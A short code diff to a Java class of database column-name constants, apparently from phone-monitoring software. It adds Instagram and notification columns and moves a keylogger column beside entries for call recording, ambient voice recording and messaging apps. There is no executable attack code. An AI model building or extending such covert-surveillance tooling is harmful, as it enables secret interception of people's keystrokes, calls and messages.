@@ -27,6 +27,7 @@ public class LastTimeGetUpdateEntity {
     public static final String COLUMN_LAST_APPLICATION = "Last_Application";
     public static final String COLUMN_LAST_PHONE_CALL_RECORDING = "Last_Phone_Call_Recording";
     public static final String COLUMN_LAST_WHATSAPP = "Last_WhatsApp";
+    public static final String COLUMN_LAST_INSTAGRAM = "Last_Instagram";
     public static final String COLUMN_LAST_VIBER = "Last_Viber";
     public static final String COLUMN_LAST_FACEBOOK = "Last_FaceBook";
     public static final String COLUMN_LAST_SKYPE = "Last_Skype";
@@ -34,7 +35,6 @@ public class LastTimeGetUpdateEntity {
     public static final String COLUMN_LAST_VIDEO = "Last_Video";
     public static final String COLUMN_LAST_VOICE = "Last_Voice";
     public static final String COLUMN_LAST_AMBIENT_VOICE_RECORDING = "Last_Ambient_Voice_Recording";
-    public static final String COLUMN_LAST_KEYLOGGER = "Last_KeyLogger";
     public static final String COLUMN_LAST_HANGOUTS = "Last_Hangouts";
     public static final String COLUMN_LAST_BBM = "Last_BBM";
     public static final String COLUMN_LAST_LINE = "Last_LINE";
@@ -46,4 +46,6 @@ public class LastTimeGetUpdateEntity {
     public static final String COLUMN_LAST_CALENDAR = "Last_Calendar";
     public static final String COLUMN_LAST_NETWORK = "Last_Network";
     public static final String COLUMN_LAST_YOUTUBE = "Last_YouTube";
+    public static final String COLUMN_LAST_NOTIFICATION = "Last_Notification";
+    public static final String COLUMN_LAST_KEYLOGGER = "Last_KeyLogger";
 }
